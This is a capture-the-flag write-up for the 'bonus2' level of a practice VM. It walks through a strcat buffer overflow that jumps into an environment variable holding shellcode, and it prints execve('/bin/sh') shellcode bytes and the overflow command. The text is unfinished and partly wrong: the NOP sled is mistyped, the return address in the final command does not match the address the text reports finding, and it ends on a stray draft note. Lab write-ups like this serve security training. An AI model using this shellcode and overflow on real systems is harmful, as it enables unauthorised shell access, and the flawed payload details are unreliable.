## Flag Bonus2 README: Finding Flag Bonus2

After connection on our vm with:
```bash
ssh bonus2@localhost -p 4343
```

We found a binary named bonus2. When we run it we obtain:
```sh
bonus2@RainFall:~$ ./bonus2
Segmentation fault (core dumped)
bonus2@RainFall:~$
```

Okay next step, decompile this program in order to understand what's the purpose and how to exploit it.

As you can see in our file [source](../source), there is `main` and `greetuser`.
greatuser doest somthing easy, it just write specyfic message regarding the value of language into dest and add the first arg into the string then it writes it on STDOUT with puts.
Main is just for seeking the langage of the user.

So, our plan is to use `strcat` ofr a `buffer overflow` to redirect the execute to our `environnement variable` which contain our `shellcode`.

Okay, as always, we have our receipe, now let's cook.

First let's create our `env variable`.

```sh
bonus1@RainFall:~$ export shellcode="`python -c 'print("\90x"*50 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")'`"
```

Next, we need to find the address of this variable.
For this we use our small [program](./env_variable_finder.c) for this step.
In this one, the address is: `0xbffffe57`.


./bonus2 $(python -c 'print("aA00aA01aA02aA03aA04aA05aA06aA07aA08aA09bA00bA01bA02bA03bA04bA05bA06bA07bA08bA09cA00cA01cA02cA03cA04cA05cA06cA07cA08cA09dA00dA01dA02dA03dA04dA05dA06dA07dA08dA09" + " " + "\x90"*18 + "\x01\xff\xff\xbf")')

need to add shellcode into ENV variable.

